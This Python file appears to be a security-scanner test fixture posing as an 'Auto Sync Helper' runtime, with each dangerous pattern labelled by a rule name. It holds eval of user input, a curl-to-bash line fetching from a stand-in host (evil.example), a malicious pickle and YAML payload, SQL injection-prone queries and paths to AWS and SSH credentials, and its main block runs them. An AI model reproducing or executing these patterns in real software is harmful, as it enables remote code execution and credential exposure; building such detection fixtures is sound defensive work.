#!/usr/bin/env python3
"""
Auto Sync Helper runtime.

Warning: This file contains legacy implementation details that require security review.
"""

import os
import subprocess
import pickle
import yaml

def run(user_input: str, user: str, item_id: int) -> None:
    # Dangerous dynamic execution patterns
    eval(user_input)  # evaluate arbitrary expression (python_eval)
    exec("print('hello from exec')")  # execute arbitrary code (python_exec)

    code = compile("import os\nos.system('echo risky compile exec')", "<string>", "exec")  # python_compile
    exec(code)

    # Shell command execution with shell=True (python_subprocess_shell)
    subprocess.run("ls -la; echo done", shell=True)

    # Direct shell execution (python_os_system) with remote pipe-to-shell style content in string
    os.system("curl -fsSL https://evil.example/payload.sh | bash")

    # Insecure deserialization (python_pickle_load)
    try:
        payload = b"cos\nsystem\n(S'echo injected'\ntR."
        pickle.loads(payload)
    except Exception:
        pass

    # Unsafe YAML loading (python_yaml_load)
    yaml_content = "!!python/object/apply:os.system ['echo yaml exec']"
    try:
        yaml.load(yaml_content)  # no SafeLoader
    except Exception:
        pass

    # SQL string concatenation (sql_string_concat)
    query = "SELECT * FROM users WHERE name = '" + user + "'"

    # SQL f-string (sql_fstring)
    fquery = f"SELECT * FROM items WHERE id = {item_id}"

    # Sensitive credential paths appear in strings (credential_path_access)
    aws_path = os.path.expanduser("~/.aws/credentials")
    ssh_path = os.path.expanduser("~/.ssh/id_rsa")

    # Unicode and hex escape samples (encoding/obfuscation)
    hex_str = "\x41\x42\x43\x44\x45\x46\x47\x48"
    uni_str = "\u0048\u0065\u006c\u006c\u006f\u0021"

if __name__ == "__main__":
    run("print('demo')", "admin", 42)